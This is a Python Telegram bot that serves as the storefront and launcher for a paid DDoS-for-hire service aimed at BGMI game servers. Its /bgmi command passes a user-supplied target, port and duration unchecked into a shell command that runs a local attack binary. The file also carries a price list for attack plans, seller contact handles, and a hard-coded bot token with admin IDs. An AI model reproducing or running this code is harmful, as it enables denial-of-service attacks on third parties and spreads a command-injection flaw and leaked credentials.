import telebot
import subprocess
import requests
import datetime
import os 
import time  
# insert your Telegram bot token here
bot = telebot.TeleBot('6664667063:AAHR2ai2Uu5nRSWKpxQQxUJsXMGVdA2pqN0')   
    
# Admin user IDs
admin_id = ["1909392304","1247301573"] 
allowed_group_ids = ['-1002090402811']
# File to store allowed user IDs
USER_FILE = "users.txt" 
              
# File to store command logs
LOG_FILE = "log.txt"  


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def is_access_allowed(user_id):
    return user_id in allowed_user_ids

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    # Check if command is from an allowed group and by an admin
    if chat_id in allowed_group_ids and user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "You don't have permission to use this command here 😡."
    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    # Check if command is from an allowed group and by an admin
    if chat_id in allowed_group_ids and user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Please specify a user ID to remove 😒."
    else:
        response = "You don't have permission to use this command here 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    # Specific Telegram group ID
    correct_group_id = -1002090402811  # Replace with your actual group ID

    # Check if the message is coming from the correct group
    if message.chat.type in ["group", "supergroup"]:
        if message.chat.id != correct_group_id:
            group_link = "https://t.me/+3Oc1_zkSAjkwZjNl"  # Modify this with your actual group link
            response = f"Please use this command in our dedicated Telegram group: {group_link}\n Dev: @crackddos"
            bot.reply_to(message, response)
            return

        user_id = str(message.from_user.id)

        # Checking if user is allowed based on user_id
        if not is_access_allowed(user_id):
            response = "❌ You Are Not Authorized To Use This Command ❌. Please Contact @crackddos To Get Access.\n Dev: @crackddos"
            bot.reply_to(message, response)
            return

        command_parts = message.text.split()
        if len(command_parts) == 4:
            target, port, time = command_parts[1:]
            try:
                port = int(port)
                time = int(time)
                if time > 240:
                    response = "Error: Time interval must be less than 240."
                else:
                    record_command_logs(user_id, '/bgmi', target, port, time)
                    log_command(user_id, target, port, time)
                    full_command = f"./bgmi {target} {port} {time} 240"
                    start_attack_reply(message, target, port, time)
                    subprocess.run(full_command, shell=True)
                    response = f"🚀BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
            except ValueError:
                response = "Invalid port or time. Please enter valid integers."
        else:
            response = "✅ Usage: /bgmi <target> <port> <time>"

        bot.reply_to(message, response)
    else:
        response = "This command is only available in groups."
        bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
🚀 /bgmi : Method For Bgmi Servers. 
🚀 /rules : Please Check Before Use !!.
🚀 /mylogs : To Check Your Recents Attacks.
🚀 /plan : Checkout Our Botnet Rates.

🚀 Buy From :- @crackddos
🚀 Official Channel :- @titanddosofficial
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to The Bot, Titan 💖
                    🤖Feel Free to Explore. 
                    ✅Join :- t.me/titanddosofficial'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Our Bgmi Ddos Plans:


𝗕𝗚𝗠𝗜 𝗗𝗗𝗢𝗦 🚀 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 ✅

𝘽𝙂𝙈𝙄 𝘿𝘿𝙊𝙎 🚀 𝙃𝘼𝘾𝙆 𝙋𝙇𝘼𝙉𝙎 !!! 
𝟭 𝗛𝗢𝗨𝗥 :- 𝟯𝟵₹
𝟭 𝗗𝗔𝗬 :- 𝟭𝟰𝟵₹
𝟮 𝗗𝗔𝗬 :- 𝟮𝟰𝟵₹
𝟯 𝗗𝗔𝗬 :- 𝟯𝟰𝟵₹
𝟳 𝗗𝗔𝗬 :- 𝟰𝟵𝟵₹

𝐃𝐌 :- @crackddos
𝐃𝐌 :- @AviGamingOp
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorized Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)




if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except requests.exceptions.ReadTimeout:
            print("Request timed out. Trying again...")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
